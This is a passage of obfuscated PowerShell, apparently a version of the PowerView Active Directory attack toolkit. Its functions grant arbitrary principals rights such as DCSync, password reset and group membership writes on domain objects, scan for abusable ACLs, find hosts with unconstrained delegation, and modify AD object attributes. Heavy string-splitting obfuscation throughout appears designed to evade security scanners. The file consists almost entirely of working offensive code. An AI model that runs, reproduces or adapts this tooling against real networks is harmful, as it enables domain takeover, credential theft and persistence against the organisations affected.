                            if( (${_}."N`AmE" -eq ("{2}{0}{1}" -f'ec',("{0}{1}"-f 'tTy','pe'),'Obj')) -or (${_}."Na`me" -eq ("{0}{3}{4}{1}{2}"-f 'Inh',("{1}{2}{0}"-f'Ty','tedO','bject'),'pe','er','i')) ) {
                                try {
                                    ${AClP`R`OPer`TIES}[${_}."n`AmE"] = ${gU`I`dS}[${_}."VAl`Ue".("{1}{2}{0}"-f ("{1}{0}" -f 'ing','r'),'t','oSt')."In`VOKE"()]
                                }
                                catch {
                                    ${A`clP`RopE`RT`ies}[${_}."nA`mE"] = ${_}."V`ALuE"
                                }
                            }
                            else {
                                ${AcLPR`o`P`er`Ties}[${_}."n`AMe"] = ${_}."vA`LuE"
                            }
                        }
                        &("{0}{1}{2}"-f ("{1}{0}"-f'-Ob','New'),'j','ect') -TypeName ("{0}{1}" -f 'P',("{2}{0}{1}"-f 'e','ct','SObj')) -Property ${AClpRop`Er`T`IES}
                    }
                    else { ${_} }
                }
            }
            catch {
                &("{3}{1}{2}{0}" -f'ng','te-',("{1}{0}" -f 'ni','War'),'Wri') ${_}
            }
        }
    }
}


function ADd-oB`jE`CTAcL {


    [CmdletBinding()]
    Param (
        [String]
        ${taRG`eTSa`mACc`OUnT`N`AME},

        [String]
        ${TA`Rgetn`A`mE} = "*",

        [Alias('DN')]
        [String]
        ${t`ARG`eTDIst`I`NgUIshEDnAme} = "*",

        [String]
        ${T`ArGET`F`ILteR},

        [String]
        ${T`ArG`eTaDS`p`ATh},

        [String]
        ${TArG`etaD`spREFIX},

        [String]
        [ValidatePattern({"{10}{5}{7}{8}{3}{6}{2}{9}{1}{4}{0}"-f'+',{"{0}{1}"-f '-[','0-'},']',{"{1}{2}{0}{3}"-f '9]+','-','9]+-[0-','-'},'9]','-1-',{"{1}{0}"-f '-9','[0'},{"{0}{1}"-f '5-2','1-['},'0','+','^S'})]
        ${PRIN`CiPAls`Id},

        [String]
        ${PR`I`NcIPAlnAMe},

        [String]
        ${pRInCI`pAlS`AmacCO`U`N`Tn`AME},

        [String]
        [ValidateSet("All",{"{2}{3}{0}{1}"-f'sw','ord',{"{2}{1}{0}" -f 'tP','e','Res'},'as'},{"{2}{0}{1}{3}" -f 'te','M','Wri',{"{0}{1}" -f'emb','ers'}},{"{1}{0}" -f("{0}{1}"-f 'Sy','nc'),'DC'})]
        ${RIg`HTs} = "All",

        [String]
        ${rIG`h`TsguiD},

        [String]
        ${dOm`A`In},

        [String]
        ${d`om`A`i`NconTRolLer},

        [ValidateRange(1,10000)] 
        [Int]
        ${PA`gesiZE} = 200
    )

    begin {
        ${SeaR`Ch`er} = &("{0}{2}{1}{4}{3}" -f 'G',("{1}{2}{0}"-f'r','ainSe','a'),("{0}{1}"-f'et-D','om'),'er','ch') -Domain ${do`M`AIn} -DomainController ${dO`maiNCoN`Tr`OlL`eR} -ADSpath ${t`ARGe`TA`dSPAth} -ADSprefix ${Ta`RGetAdspRE`F`IX} -PageSize ${PA`G`esiZe}

        if(!${pr`iNcipA`lSID}) {
            ${P`R`iNC`Ipal} = &("{0}{1}{2}{3}"-f'Get',("{0}{1}{2}"-f'-','ADO','bj'),'e','ct') -Domain ${DO`MAIn} -DomainController ${domA`INCO`N`TROLl`eR} -Name ${pr`InC`i`Paln`AmE} -SamAccountName ${p`Rin`ciP`AlSa`mACcOUntNAME} -PageSize ${PA`GeS`izE}
            
            if(!${p`Rin`CI`PaL}) {
                throw ("{4}{2}{3}{1}{0}{6}{5}{7}" -f'c',("{2}{1}{0}"-f'rin','ng p','lvi'),'ror',("{0}{1}" -f' ','reso'),'Er','a','ip','l')
            }
            ${Pr`in`C`ipalsiD} = ${PrI`NcIp`AL}."o`BjE`CTSID"
        }
        if(!${P`Rinc`iPALSID}) {
            throw ("{3}{2}{7}{4}{0}{6}{1}{5}"-f's',("{0}{1}"-f 'nci','pa'),'rr','E','e','l',("{2}{1}{0}" -f 'ng pri','vi','ol'),("{1}{0}" -f'r r','o'))
        }
    }

    process {

        if (${sea`RcH`er}) {

            if(${tArG`e`Ts`AMa`cCoU`Ntname}) {
                ${seA`Rc`her}."fI`lTeR"="(&(samaccountname=$TargetSamAccountName)(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
            else {
                ${sEA`Rch`eR}."fIL`Ter"="(&(name=$TargetName)(distinguishedname=$TargetDistinguishedName)$TargetFilter)"  
            }
  
            try {
                ${se`ARCH`er}.("{0}{1}" -f ("{0}{1}" -f 'Find','Al'),'l')."i`NvoKe"() | &("{1}{3}{2}{0}"-f("{2}{0}{1}"-f'jec','t','e-Ob'),'W','r','he') {${_}} | &("{2}{1}{0}{3}" -f ("{1}{0}"-f'ach-','e'),'or','F',("{1}{0}"-f't','Objec')) {
                    

                    ${T`ArGET`DN} = ${_}."pR`OPe`RtI`es"."d`ISTIn`Gu`ISHE`DNAME"

                    ${Ide`Nti`TY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${PriN`CipalS`ID})
                    ${i`Nh`E`Ritan`cetYpe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}"-f 'Non','e')
                    ${C`oNtRo`L`TypE} = [System.Security.AccessControl.AccessControlType] ("{1}{0}" -f'w',("{0}{1}"-f 'A','llo'))
                    ${AC`es} = @()

                    if(${rIght`s`G`UID}) {
                        ${gui`DS} = @(${RIGHTs`g`UId})
                    }
                    else {
                        ${G`Uids} = Switch (${rig`Hts}) {
                            
                            ("{1}{2}{0}"-f 'rd','Res',("{0}{1}" -f 'etPa','sswo')) { ("{1}{6}{4}{0}{3}{7}{2}{5}" -f("{1}{0}" -f 'd-','246'),("{1}{0}"-f'99','002'),("{0}{1}{2}" -f '0aa00','6','e'),("{1}{0}" -f '0','11d'),'-',("{1}{0}" -f'29','05'),'570',("{1}{2}{0}" -f'-0','-','a768')) }
                            
                            ("{1}{0}{2}{3}" -f'ite','Wr','M',("{0}{2}{1}" -f 'e','s','mber')) { ("{1}{8}{5}{6}{4}{2}{3}{0}{7}"-f'03','b',("{1}{0}" -f'0','5-0'),'aa0','8',("{1}{0}" -f 'a','1d0-'),'2',("{1}{0}"-f'2','049e'),("{1}{4}{0}{3}{2}"-f'7','f','e6-1','9c0-0d','96')) }
                            
                            
                            
                            
                            ("{1}{0}{2}"-f ("{0}{1}" -f'CSy','n'),'D','c') { ("{4}{2}{1}{0}{3}{5}" -f("{1}{3}{4}{2}{0}" -f'0c0','-11d','0','1-f','79f-'),("{0}{1}{2}{3}"-f'1f6aa','-','9c0','7'),'13','4f','1',("{0}{1}"-f 'c2','dcd2')), ("{1}{7}{9}{6}{2}{4}{5}{10}{3}{8}{0}"-f ("{1}{0}" -f '2','dcd'),'1','07','04f',("{0}{1}"-f '-1','1d'),("{0}{1}{2}"-f'1-','f','79f-'),'9c','13','c2',("{2}{0}{1}"-f'f','6ad-','1'),'00c'), ("{2}{4}{3}{0}{7}{5}{6}{1}{8}{9}" -f("{0}{1}"-f'-4c6','2'),("{1}{0}"-f '-0f','a'),'89',("{2}{0}{1}"-f'4','d','5b76-44'),'e9','99','1','-','acb',("{1}{0}" -f 'da640c','e'))}
                        }
                    }

                    if(${g`UiDs}) {
                        foreach(${gU`iD} in ${g`UI`Ds}) {
                            ${N`ewgu`ID} = &("{1}{2}{0}" -f("{1}{0}"-f 'ject','b'),("{0}{1}" -f 'Ne','w-'),'O') ("{1}{0}" -f 'uid','G') ${Gu`ID}
                            ${ad`R`Ig`hts} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{1}{2}"-f("{2}{0}{1}" -f 'x','tende','E'),'d',("{0}{1}"-f 'Rig','ht'))
                            ${AC`eS} += &("{1}{0}{2}"-f 'e','N',("{0}{1}{2}" -f 'w','-Ob','ject')) ("{1}{4}{10}{7}{8}{5}{3}{0}{2}{9}{6}"-f("{3}{4}{2}{0}{1}"-f 'rect','oryAcce','Di','i','ve'),("{1}{2}{0}"-f'm.D','Sys','te'),'s',("{1}{0}"-f 't','.Ac'),("{1}{0}"-f 'to','irec'),'es','e','y',("{0}{2}{1}"-f'S','c','ervi'),("{1}{0}" -f'Rul','s'),'r') ${id`ENT`Ity},${ADr`IgH`Ts},${c`ontRo`LTYPe},${N`EW`gUid},${i`NHeRi`Tan`C`ETyPe}
                        }
                    }
                    else {
                        
                        ${A`DR`ightS} = [System.DirectoryServices.ActiveDirectoryRights] ("{0}{1}{2}" -f ("{0}{1}"-f 'G','ener'),'ic','All')
                        ${ac`Es} += &("{2}{1}{0}{3}"-f 'w-','e','N',("{0}{1}"-f'Obje','ct')) ("{6}{8}{2}{0}{4}{5}{7}{3}{1}"-f("{2}{0}{3}{1}"-f 'to','vices.A','rec','rySer'),("{0}{2}{1}"-f'ec','ryAccessRule','to'),'.Di',("{0}{1}" -f 'eD','ir'),'ct','i',("{0}{1}"-f 'Sys','te'),'v','m') ${id`EN`TITY},${AD`R`iG`HTS},${Con`T`RoLt`YpE},${InheRi`TanC`eT`ype}
                    }

                    &("{1}{3}{0}{2}"-f'e','W',("{2}{0}{1}"-f's','e','-Verbo'),'rit') "Granting principal $PrincipalSID '$Rights' on $($_.Properties.distinguishedname)  "

                    try {
                        
                        ForEach (${a`Ce} in ${A`CeS}) {
                            &("{0}{3}{1}{2}"-f ("{1}{0}"-f 't','Wri'),("{0}{1}"-f'erb','o'),'se','e-V') "Granting principal $PrincipalSID '$($ACE.ObjectType)' rights on $($_.Properties.distinguishedname)  "
                            ${Obj`E`Ct} = [adsi](${_}."p`ATH")
                            ${oBje`CT}."pSB`A`SE"."O`B`JeCt`sEcURiTY".("{4}{1}{3}{2}{0}"-f'ule','A','R',("{1}{0}"-f'ss','cce'),'Add')."INVO`kE"(${A`ce})
                            ${obj`eCT}."Psb`A`SE".("{2}{0}{4}{3}{1}" -f'i',("{1}{0}"-f's','ange'),("{0}{1}"-f 'c','omm'),'ch','t')."iN`VokE"()
                        }
                    }
                    catch {
                        &("{1}{2}{0}" -f ("{0}{2}{1}" -f'a','ning','r'),("{1}{0}"-f '-','Write'),'W') ('E'+'rr'+'or '+("{1}{0}"-f 'n','gra')+'ti'+'ng '+'p'+("{0}{1}{2}" -f'ri','nc','ip')+'al '+("$PrincipalSID "+'')+("'$Rights' "+'')+'o'+'n '+("$TargetDN "+'')+': '+"$_")
                    }
                }
            }
            catch {
                &("{0}{2}{1}" -f'W',("{0}{1}" -f 'arnin','g'),("{2}{0}{1}"-f'ite','-W','r')) ('E'+'r'+("{1}{0}"-f' ','ror:')+"$_")
            }
        }
    }
}


function iN`VO`KE-AcL`SCa`NneR {


    [CmdletBinding()]
    Param (
        [Parameter(vALUEfroMpIPeLiNe=${t`RUE})]
        [String]
        ${SamAcco`U`NTN`A`me},

        [String]
        ${N`AmE} = "*",

        [Alias('DN')]
        [String]
        ${DIST`IngU`ished`N`Ame} = "*",

        [String]
        ${fILt`er},

        [String]
        ${ADS`p`AtH},

        [String]
        ${AD`sp`R`eFix},

        [String]
        ${d`o`mAIN},

        [String]
        ${doma`inC`ont`R`OL`LeR},

        [Switch]
        ${rE`Sol`VEGuIdS},

        [ValidateRange(1,10000)] 
        [Int]
        ${paG`EsIZe} = 200
    )

    
    &("{3}{1}{4}{0}{2}"-f 'A',("{0}{1}"-f'-Ob','je'),'CL','Get','ct') @PSBoundParameters | &("{2}{1}{0}{3}"-f 'E','r','Fo',("{1}{2}{0}" -f 'ject','ac','h-Ob')) {
        
        ${_} | &("{1}{2}{0}" -f'ber','Add',("{0}{1}"-f'-','Mem')) ("{3}{1}{2}{0}"-f("{0}{1}" -f 'opert','y'),'ote','pr','N') ("{2}{0}{1}" -f("{0}{1}"-f 'den','tit'),("{0}{1}"-f 'yS','ID'),'I') (${_}."idEN`Ti`TY`REfERencE"."tra`Ns`LAte"([System.Security.Principal.SecurityIdentifier])."vAl`UE")
        ${_}
    } | &("{2}{0}{1}{3}" -f 'e','-O',("{1}{0}"-f'her','W'),("{1}{0}" -f 't','bjec')) {
        
        try {
            [int](${_}."IDENTIT`y`siD".("{0}{1}" -f'spl','it')."INvO`KE"("-")[-1]) -ge 1000
        }
        catch {}
    } | &("{2}{0}{1}" -f 'je','ct',("{0}{1}"-f 'W','here-Ob')) {
        
        (${_}."AC`TIvEdi`R`eCt`Or`yRiGHTs" -eq ("{1}{2}{0}" -f'll',("{1}{0}"-f 'ne','Ge'),("{1}{0}" -f 'icA','r'))) -or (${_}."A`cT`ivEdi`ReCtOR`Y`R`IgHts" -match ("{1}{0}"-f'te','Wri')) -or (${_}."acT`iv`EDirE`ctOr`yRIgHts" -match ("{1}{0}" -f ("{1}{0}" -f 'e','eat'),'Cr')) -or (${_}."ACtiveDi`RE`ctO`RYRI`g`htS" -match ("{2}{1}{0}"-f'ete','el','D')) -or ((${_}."ACti`VED`I`ReC`TOryRI`g`hTs" -match ("{2}{1}{0}{3}"-f("{0}{1}" -f 'ded','R'),'ten','Ex',("{1}{0}" -f 'ht','ig'))) -and (${_}."acCESsCon`TR`o`lT`ypE" -eq ("{1}{0}" -f("{0}{1}" -f'll','ow'),'A')))
    }
}


function gEt-GUID`M`Ap {


    [CmdletBinding()]
    Param (
        [String]
        ${Dom`AIn},

        [String]
        ${DOm`AIncoN`T`RO`llEr},

        [ValidateRange(1,10000)] 
        [Int]
        ${PAG`e`Size} = 200
    )

    ${gUI`Ds} = @{("{3}{0}{1}{4}{5}{2}"-f '000','0-0',("{1}{0}"-f'00','000'),("{1}{0}"-f '00','00'),("{4}{2}{5}{0}{3}{1}"-f'000','00000','00','0-','0','-0000-'),'00') = 'All'}

    ${SC`HeM`APaTH} = (&("{0}{2}{1}" -f ("{0}{1}"-f'Get-Net','F'),'st','ore'))."SC`HEMa"."N`AmE"

    ${SCh`emaSear`C`h`er} = &("{1}{2}{3}{0}{4}" -f("{1}{0}"-f'rch','a'),'Get',("{1}{0}" -f'Doma','-'),("{0}{1}"-f 'in','Se'),'er') -ADSpath ${SChe`Mapa`Th} -DomainController ${dO`mAiNC`ONtrOl`ler} -PageSize ${PA`ge`siZe}
    if(${sCHEM`As`e`A`RCheR}) {
        ${s`ch`E`mAsEARChEr}."FiL`T`eR" = ("{0}{3}{1}{2}" -f '(','c',((("{0}{2}{1}" -f 'he','IDGUID=*)','ma'))),'s')
        try {
            ${scHEmAS`ear`CHeR}.("{0}{2}{1}" -f'Fi','ll','ndA')."INv`Oke"() | &("{3}{2}{0}{1}" -f ("{1}{0}"-f'e-','er'),("{1}{0}{2}"-f'bj','O','ect'),'h','W') {${_}} | &("{3}{2}{1}{0}" -f 'ct','je',("{0}{1}"-f'Ea','ch-Ob'),'For') {
                
                ${gu`Ids}[(&("{2}{1}{3}{0}"-f'ect','w-','Ne','Obj') ("{1}{0}"-f'uid','G') (,${_}."pRO`p`eRTieS"."S`CH`EMaiDgu`Id"[0]))."gU`Id"] = ${_}."p`R`oPErties"."N`AME"[0]
            }
        }
        catch {
            &("{2}{0}{1}"-f 'Deb','ug',("{0}{1}"-f'W','rite-')) (("{1}{0}" -f'or','Err')+' '+'i'+'n '+'bui'+'ldi'+'ng '+'GUI'+'D '+("{1}{0}"-f':','map')+' '+"$_")
        }      
    }

    ${Ri`Ghts`Se`ARCHEr} = &("{1}{0}{3}{2}"-f ("{0}{2}{1}"-f 'Doma','nS','i'),("{0}{1}"-f 'Get','-'),("{0}{1}" -f 'arch','er'),'e') -ADSpath ${sc`heMApA`TH}.("{0}{1}"-f("{1}{0}" -f'epla','r'),'ce')."INVO`Ke"(("{0}{1}" -f 'Sc',("{0}{1}"-f 'h','ema')),("{3}{2}{4}{0}{1}" -f'i',("{1}{0}" -f's','ght'),'t','Ex',("{2}{0}{1}"-f'nded','-R','e'))) -DomainController ${dOM`AInC`o`Nt`R`olLER} -PageSize ${paGEs`i`zE}
    if (${r`I`gH`TsSe`ARCHEr}) {
        ${r`IGH`T`Ss`EARCHer}."F`ILtER" = (("{1}{4}{5}{3}{2}{0}" -f')',((("{1}{0}{2}"-f'bjectC','(o','la'))),("{0}{1}"-f 'ss','Right'),'ce',("{1}{3}{2}{0}" -f'l','s','contro','s='),'Ac'))
        try {
            ${RIghts`sEar`cHER}.("{2}{1}{0}" -f 'll',("{1}{0}" -f'ndA','i'),'F')."I`NvOke"() | &("{2}{0}{1}"-f("{0}{1}{2}" -f'ere-','O','bj'),'ect','Wh') {${_}} | &("{1}{2}{0}" -f'ect','For',("{1}{0}{2}" -f 'b','Each-O','j')) {
                
                ${GUi`dS}[${_}."prOPE`Rti`Es"."r`iG`htSGuid"[0].("{0}{2}{1}" -f 'toS','ing','tr')."in`Voke"()] = ${_}."p`RoPErtI`eS"."n`AmE"[0]
            }
        }
        catch {
            &("{2}{3}{0}{1}" -f 'u','g',("{0}{1}"-f 'Wri','t'),("{0}{1}" -f 'e','-Deb')) (("{0}{1}" -f 'E','rro')+'r'+' '+'i'+'n '+("{0}{1}"-f 'bui','ldi')+'ng'+' '+'GU'+'ID '+'m'+("{0}{1}" -f 'ap',': ')+"$_")
        }
    }

    ${gu`Ids}
}


function ge`T`-N`eTCO`MP`UteR {


    [CmdletBinding()]
    Param (
        [Parameter(VALUEFromPIPeLinE=${tr`Ue})]
        [Alias({"{1}{2}{0}"-f ("{0}{1}" -f'tNa','me'),'Ho','s'})]
        [String]
        ${CoMPu`TErn`A`me} = '*',

        [String]
        ${s`Pn},

        [String]
        ${op`E`RaTIN`GSY`STem},

        [String]
        ${s`erVICe`pAcK},

        [String]
        ${Fi`Lt`Er},

        [Switch]
        ${PrI`NTe`Rs},

        [Switch]
        ${Pi`NG},

        [Switch]
        ${f`ULlD`AtA},

        [String]
        ${D`omaIn},

        [String]
        ${D`omainC`ONT`R`Ol`LER},

        [String]
        ${Ad`sP`ATH},

        [Switch]
        ${UN`CO`N`st`RaINeD},

        [ValidateRange(1,10000)] 
        [Int]
        ${Pa`ge`SiZE} = 200
    )

    begin {
        
        ${c`oMp`SEAR`CHER} = &("{5}{3}{1}{2}{4}{0}" -f'er',("{1}{0}" -f'nS','omai'),("{1}{0}" -f 'c','ear'),'t-D','h','Ge') -Domain ${D`Om`AIn} -DomainController ${D`oM`AiNcOntr`OlL`er} -ADSpath ${ads`P`AtH} -PageSize ${Pa`ge`siZE}
    }

    process {

        if (${co`mPsEaR`CHer}) {

            
            if(${uncO`NStR`A`Ined}) {
                &("{1}{0}{2}{3}" -f 'r',("{0}{1}{2}"-f'Wri','te-','Ve'),'bos','e') ("{7}{8}{1}{4}{3}{10}{0}{2}{6}{5}{9}" -f("{0}{1}" -f'ncon','st'),("{0}{1}"-f'for',' '),'r',("{0}{2}{1}" -f 'ers wi','r ','th fo'),("{0}{1}"-f'comp','ut'),'ega',("{1}{0}"-f 'el','ained d'),("{0}{1}{2}"-f 'Sea','rch','in'),'g ',("{1}{0}" -f 'n','tio'),'u')
                ${F`IlT`eR} += (("{8}{3}{1}{2}{6}{5}{7}{0}{9}{4}" -f("{0}{2}{1}" -f '4.803','=5',':'),("{0}{1}{2}" -f'ntC','on','tr'),("{1}{0}" -f':1.2.84','ol'),'u',')',("{0}{1}"-f'.','1135'),'0',("{1}{0}"-f '6.1.','5'),((("{1}{0}"-f 'Acco','(user'))),("{0}{1}" -f'2','4288')))
            }
            
            if(${P`RIn`Te`Rs}) {
                &("{3}{2}{1}{0}"-f'se','o',("{0}{1}{2}" -f 'r','i','te-Verb'),'W') ("{1}{0}{2}{4}{6}{5}{3}"-f'hi',("{0}{1}" -f'Se','arc'),("{1}{0}" -f 'g f','n'),'ers',("{0}{1}"-f 'or ','pr'),'nt','i')
                
                ${FiL`Ter} += (("{8}{2}{3}{4}{7}{5}{6}{1}{0}"-f 'e)','eu','je','ct','Ca','int','Qu',("{1}{2}{0}" -f'=pr','tegor','y'),'(ob'))
            }
            if(${s`Pn}) {
                &("{0}{2}{1}{3}" -f("{0}{1}{2}"-f'W','rit','e-'),'er','V',("{0}{1}"-f 'bo','se')) ('Se'+("{0}{1}" -f 'ar','ch')+("{0}{1}" -f 'i','ng ')+'for'+' '+("{1}{0}"-f'mp','co')+'u'+'te'+'rs '+("{1}{0}" -f 'th','wi')+' '+'S'+("{0}{1}" -f 'PN',': ')+"$SPN")
                ${Fi`LTER} += "(servicePrincipalName=$SPN)"
            }
            if(${OPE`RAti`N`GSyStem}) {
                ${F`IlTER} += "(operatingsystem=$OperatingSystem)"
            }
            if(${SErVI`c`E`paCK}) {
                ${Fi`lter} += "(operatingsystemservicepack=$ServicePack)"
            }

            ${cOM`p`sEa`RCh`er}."fIl`TeR" = "(&(sAMAccountType=805306369)(dnshostname=$ComputerName)$Filter)"

            try {

                ${coMpSe`Arc`HEr}.("{1}{0}{2}" -f'dA','Fin','ll')."iNvO`Ke"() | &("{0}{1}{2}"-f'W','her',("{2}{0}{1}" -f 'jec','t','e-Ob')) {${_}} | &("{4}{3}{2}{0}{1}" -f'ec','t',("{1}{0}" -f 'bj','-O'),'ach',("{0}{1}"-f'For','E')) {
                    ${uP} = ${T`RuE}
                    if(${pi`Ng}) {
                        
                        ${up} = &("{0}{3}{2}{1}" -f'Tes',("{1}{0}"-f'n','tio'),("{0}{1}"-f 'nn','ec'),("{0}{1}"-f't-','Co')) -Count 1 -Quiet -ComputerName ${_}."pROP`erTi`eS"."DNsho`sT`NaME"
                    }
                    if(${u`p}) {
                        
                        if (${Fu`lLda`TA}) {
                            
                            &("{2}{1}{3}{0}{4}"-f'r',("{0}{1}"-f'L','DAP'),("{0}{2}{1}" -f 'Con','-','vert'),("{1}{0}"-f'e','Prop'),'ty') -Properties ${_}."PropeR`T`iES"
                        }
                        else {
                            
                            ${_}."p`ROPErt`Ies"."DN`SHosTn`AMe"
                        }
                    }
                }
            }
            catch {
                &("{1}{0}{2}"-f'r',("{2}{0}{1}"-f '-','Wa','Write'),("{0}{1}" -f'ni','ng')) ('Er'+'ror'+': '+"$_")
            }
        }
    }
}


function Get`-aD`o`BJecT {


    [CmdletBinding()]
    Param (
        [Parameter(VAlUEFROMpIpELine=${tr`Ue})]
        [String]
        ${s`iD},

        [String]
        ${NA`mE},

        [String]
        ${s`A`maCcOU`NT`NamE},

        [String]
        ${DoMa`in},

        [String]
        ${d`O`mAInC`oNTro`LLer},

        [String]
        ${adS`PA`TH},

        [String]
        ${Fi`LtER},

        [Switch]
        ${rET`UR`NRAw},

        [ValidateRange(1,10000)] 
        [Int]
        ${paG`ESi`ze} = 200
    )
    process {
        if(${s`iD}) {
            
            try {
                ${NA`me} = &("{0}{2}{4}{1}{3}"-f 'Con','m',("{0}{1}" -f 'ver','t-Si'),'e',("{0}{1}" -f 'dT','oNa')) ${s`id}
                if(${n`AMe}) {
                    ${C`An`ON`iCAl} = &("{1}{4}{2}{3}{5}{6}{0}"-f 'l',("{1}{0}" -f 've','Con'),'t','-','r','NT4',("{3}{1}{0}{2}" -f 'n','no','ica','toCa')) -ObjectName ${nA`ME}
                    if(${c`AN`On`iCAl}) {
                        ${DomA`IN} = ${C`A`NoNiC`AL}.("{1}{0}" -f 't',("{0}{1}" -f'spl','i'))."INV`O`Ke"("/")[0]
                    }
                    else {
                        &("{0}{2}{3}{1}" -f ("{1}{0}" -f'te','Wri'),("{0}{1}"-f'ni','ng'),'-Wa','r') ('Err'+'or'+' '+'re'+("{1}{0}"-f'olv','s')+'i'+'ng '+'SI'+'D '+"'$SID'")
                        return ${Nu`ll}
                    }
                }
            }
            catch {
                &("{1}{0}{4}{3}{2}" -f("{0}{1}" -f 'te-Wa','r'),'Wri','g','in','n') ('Er'+("{1}{0}" -f'r ','ro')+'re'+'s'+("{2}{0}{1}" -f'lving',' ','o')+'SI'+'D '+("'$SID' "+'')+': '+"$_")
                return ${N`ULL}
            }
        }

        ${ob`JE`C`TS`eaRcHEr} = &("{1}{0}{4}{5}{3}{2}" -f ("{1}{2}{0}"-f'ma','t','-Do'),'Ge','r','e','i',("{0}{1}{2}"-f'nS','ear','ch')) -Domain ${DO`m`AIn} -DomainController ${dom`AIN`Co`NTrOlL`er} -ADSpath ${a`dSP`ATH} -PageSize ${P`AGE`SIzE}

        if(${ob`jecT`S`eaRch`Er}) {

            if(${s`ID}) {
                ${Ob`ject`searcHer}."F`iLTer" = "(&(objectsid=$SID)$Filter)"
            }
            elseif(${NA`me}) {
                ${oB`j`ECTseaRc`HeR}."Filt`ER" = "(&(name=$Name)$Filter)"
            }
            elseif(${SAMaC`cOU`NT`NA`mE}) {
                ${oBje`ctS`e`ArCHeR}."FIl`T`er" = "(&(samAccountName=$SamAccountName)$Filter)"
            }

            ${OBjects`Ea`RcH`Er}.("{0}{2}{1}" -f'Fi','All','nd')."IN`VoKe"() | &("{2}{1}{0}"-f("{0}{2}{1}" -f'e-','ct','Obje'),'r','Whe') {${_}} | &("{1}{2}{0}{4}{3}" -f'h',("{1}{0}" -f 'orE','F'),'ac',("{1}{0}" -f 'ct','Obje'),'-') {
                if(${r`ETUrn`RaW}) {
                    ${_}
                }
                else {
                    
                    &("{2}{0}{4}{1}{3}{5}" -f ("{0}{1}" -f'LD','APPr'),'er',("{0}{1}{2}" -f'Conve','r','t-'),'t','op','y') -Properties ${_}."Pr`OPER`Ties"
                }
            }
        }
    }
}


function se`T-Ad`Obj`E`CT {


    [CmdletBinding()]
    Param (
        [String]
        ${s`Id},

        [String]
        ${N`AMe},

        [String]
        ${S`AMAC`CouNTn`AMe},

        [String]
        ${D`O`mAiN},

        [String]
        ${dO`MAIN`CoNT`RolL`er},

        [String]
        ${FI`ltEr},

        [Parameter(ManDatORY = ${tr`UE})]
        [String]
        ${pr`Op`eRtyN`AME},

        ${p`ROpErtYv`ALue},

        [Int]
        ${PR`OPeRT`YXORV`AL`UE},

        [Switch]
        ${C`LEARV`ALUE},

        [ValidateRange(1,10000)] 
        [Int]
        ${p`Ag`eSiZE} = 200
    )

    ${aRg`U`Me`NTS} = @{
        'SID' = ${s`ID}
        ("{0}{1}"-f 'Nam','e') = ${N`AmE}
        ("{1}{3}{2}{0}"-f 'ame','S',("{2}{1}{0}"-f'tN','coun','mAc'),'a') = ${sama`ccouNTN`AME}
        ("{1}{0}" -f 'ain','Dom') = ${d`o`MAiN}
        ("{4}{0}{3}{2}{1}"-f ("{1}{0}" -f 'n','mai'),'er',("{1}{0}" -f'roll','ont'),'C','Do') = ${d`OM`AInCONtro`llER}
        ("{1}{2}{0}" -f'r','Fi','lte') = ${F`iltER}
        ("{1}{0}"-f ("{0}{1}"-f'age','Size'),'P') = ${pag`Es`ize}
    }
    
    ${RawoB`j`Ect} = &("{2}{0}{1}"-f("{1}{0}" -f'DOb','-A'),("{1}{0}"-f'ct','je'),'Get') -ReturnRaw @Arguments
    
    try {
        
        ${E`Nt`RY} = ${rAw`Ob`JEct}.("{4}{0}{3}{1}{2}" -f ("{0}{1}"-f'rec','t'),'yEn','try','or',("{1}{0}" -f 'Di','Get'))."iNv`oKe"()
        
        if(${Cl`EaRVa`LuE}) {
            &("{1}{3}{0}{2}" -f("{0}{1}" -f'Verbo','s'),("{1}{0}" -f'te','Wri'),'e','-') ("{2}{0}{1}{3}"-f 'e',("{0}{1}" -f'a','rin'),'Cl',("{1}{0}" -f ' value','g'))
            ${Ent`RY}.${ProPe`RtyN`AmE}.("{0}{1}"-f ("{1}{0}"-f'lea','c'),'r')."I`NVOkE"()
            ${En`TRy}.("{1}{2}{0}" -f'ges','c',("{2}{1}{0}"-f 'an','ch','ommit'))."I`NVoke"()
        }

        elseif(${PROPer`T`yxORvAL`Ue}) {
            ${t`YpEn`AME} = ${e`NtrY}.${proP`erTy`N`AMe}[0].("{0}{1}" -f'Ge',("{0}{1}" -f 'tT','ype'))."I`NVO`ke"()."NA`Me"

            
            ${P`RopERt`yVAluE} = $(${EN`TRy}.${P`ROp`Er`TYNaME}) -bxor ${pRope`R`TYx`orVA`LuE} 
            ${E`NTRY}.${P`ROp`ErtYnaME} = ${propertYvA`l`UE} -as ${tY`Pe`NAMe}       
            ${eNT`RY}.("{1}{2}{4}{0}{3}"-f'i','c','om',("{0}{2}{1}"-f'tc','ges','han'),'m')."iNV`Oke"()     
        }

        else {
            ${EnT`RY}.("{1}{0}" -f't','pu')."IN`VokE"(${P`RopeR`TYn`AME}, ${P`RO`pER`TyVa`Lue})
            ${E`NT`Ry}.("{2}{0}{1}"-f'ti','nfo','se')."Inv`oKE"()
        }
    }
    catch {
        &("{1}{0}{2}{3}" -f't','Wri','e-',("{0}{1}" -f'Warni','ng')) "Error setting property $PropertyName to value '$PropertyValue' for object $($RawObject.Properties.samaccountname) : $_  "
    }
}


function INVOk`e-`d`o`Wn`gRaD`E`AC`cOUNT {


    [CmdletBinding()]
    Param (
        [Parameter(posItIon=0,vaLUEFrompipeLiNe=${t`RuE})]
        [String]
        ${Sa`mac`coU`NTNamE},

        [String]
        ${n`AmE},

        [String]
        ${d`oMA`In},

        [String]
        ${DOmaInC`onTrOl`L`ER},

        [String]
        ${f`I`ltEr},

        [Switch]
        ${r`epAIR}
    )

    process {
        ${Ar`gUm`eNTS} = @{
            ("{2}{0}{1}" -f ("{0}{1}" -f'mAcc','o'),("{0}{1}" -f'u','ntName'),'Sa') = ${s`AMac`c`oU`NTnamE}
            ("{0}{1}"-f'N','ame') = ${NA`me}
            ("{0}{1}"-f 'D',("{1}{0}" -f 'main','o')) = ${DO`MAIn}
            ("{1}{3}{0}{2}{4}{5}" -f ("{1}{0}" -f 'Con','n'),("{0}{1}" -f'Dom','a'),'t','i',("{0}{1}" -f 'ro','lle'),'r') = ${DomAinc`on`TROl`L`ER}
            ("{0}{1}" -f'Fi',("{0}{1}" -f'lte','r')) = ${F`IlTER}
        }

        
